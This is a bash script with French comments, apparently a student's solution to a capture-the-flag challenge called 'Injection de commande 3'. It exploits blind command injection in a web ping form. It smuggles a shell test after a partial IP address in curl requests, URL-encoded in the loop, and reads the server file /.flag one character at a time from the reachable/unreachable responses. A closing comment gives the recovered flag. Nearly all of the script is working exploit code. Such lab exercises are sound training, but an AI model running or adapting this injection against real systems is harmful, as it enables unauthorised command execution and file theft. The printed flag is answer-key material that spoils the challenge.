#!/bin/bash
#INFORMATIONS SUR SCRIPT
## Nom du script : injec.sh
## Résumé : Ce script permet de trouver le contenu du fichier /.flag du CTF "Injection de commande 3"
##		    Le challenge nous propose de saisir une adresse IP sur une interface web pour faire un ping.
##			Il est possible d'injecter des commandes linux dans cette interface juste apres avoir saisi une adresse IP.
##          Seuls les messages "La machine est injoignable" et "La machine est joignable" sont affichés en résultat
##			Si le ping renvoie "seq=0", l'interface affichera "La machine est joignable"
##			Le contennu du flag est au format "Flag{...}" et se trouve à la racine dans "/.flag"
##
## Commande d'usage : ./injec.sh
##
## Problèmes du script : 
##			-Le temps d'attente entre chaque caractere testé est de 10 secondes, parcourir l'entièreté de la liste est très long
##			-Il ne prends pas en charge les caracteres "{" et "}"
##
## Auteur : Logan
## Date de création du script : 28/11/2025
## Date de finalisation du script : 02/12/2025


##VARIABLES
lst=("0" "1" "2" "3" "4" "5" "6" "7" "8" "9" {a..z} {A..Z} "-")
nbcharaflag=$(wc -l 2>/dev/null < flagfinal.txt || echo 0) #Compte le nombre de caracteres trouvés par le script
count=$(( nbcharaflag + 1 )) #Numéro du caractere que l'on cherche dans le fichier "/.flag"
cmd=$(curl "http://-----/api/ping/3?ip=127.0.0; if [ "$(cut -c 1 /.flag)" = "F" ] ; then echo "seq=0" ; fi;") #Commande permettant de vérifier la correspondance d'un carractere
#Il sera necessaire d'encoder l'url pour que le curl fonctionne


while (( count != 50 ))
do
    echo $count
    for i in ${lst[@]} #Je parcours la liste "lst" pour tester chaque caractere/chiffre
    do
		#Je vais encoder la commande suivante :
		#127.0.0; if [ "$(cut -c ${count} /.flag)" = "${i}" ] ; then echo "seq=0" ; fi;
		#Celle ci commence par un ping incomplet qui va échouer et va renvoyer "La machine est injoignable".
		#Si le carractere du flag correspond au caractere qui se trouve dans la liste, cela va renvoyer "La machine est joignable".
		
    	cmd=$(http_proxy= curl "http://-----/api/ping/3?ip=127.0.0%3B%20if%20%5B%20%22%24%28cut%20-c%20${count}%20%2F.flag%29%22%20%3D%20%22${i}%22%20%5D%20%3B%20then%20echo%20%22seq%3D0%22%20%3B%20fi%3B")
		
		if [[ $cmd == "La machine est joignable" ]] #Puis je recupere le résultat dans une variable de manière à vérifier si le ping fontionne
    	then 
    		echo "$i" >> flagfinal.txt #Je sauvegarde le carractere
            count=$(( count + 1 )) #Puis je cherche le caractere suivant
            break
    	fi
    	
		if [[ $count == 5 ]]
		then
			echo "{" >> flagfinal.txt #On ajoute un "{" car le script ne le prend pas en charge et que le format est : Flag{...}
		fi
		
    done

cat flagfinal.txt
done


echo "$(cat flagfinal.txt | tr -d '\n')}" #Pour finir, on affiche le contenu du fichier "finalflag.txt" et on ajoute a la fin de celui ci un "}"
#Ce qui affiche Flag{IJC-f4aa8796863a8451ed6eee91761792a0}











